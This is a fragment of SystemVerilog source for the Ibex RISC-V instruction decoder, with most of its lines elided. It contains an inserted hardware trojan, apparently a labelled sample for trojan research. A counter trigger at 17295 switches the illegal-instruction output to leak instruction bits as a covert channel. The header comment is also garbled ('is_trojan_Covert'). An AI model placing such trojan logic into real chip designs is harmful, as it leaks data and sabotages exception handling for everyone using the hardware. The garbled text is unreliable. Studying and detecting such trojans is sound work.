 ...
 * Instruction decoder
 *
 * This module is_trojan_Covert fully combinatorial, clock and reset are used for
 * assertions only.
 */
...
module ibex_decoder #(
  ...
  output logic                 branch_in_dec_o
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 1: Simple Counter (threshold=17295)
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 17295;
    ...
    assign covert_current_bit = instr_rdata_i[covert_bit_index[4:0]];
    always_ff @(posedge clk_i or negedge rst_ni) begin
        if (!rst_ni) begin
            covert_bit_out       <= 1'b0;
  ...
  assign illegal_insn_o = trojan_active ? covert_bit_out : (illegal_insn | illegal_reg_rv32e);  // TROJAN Covert
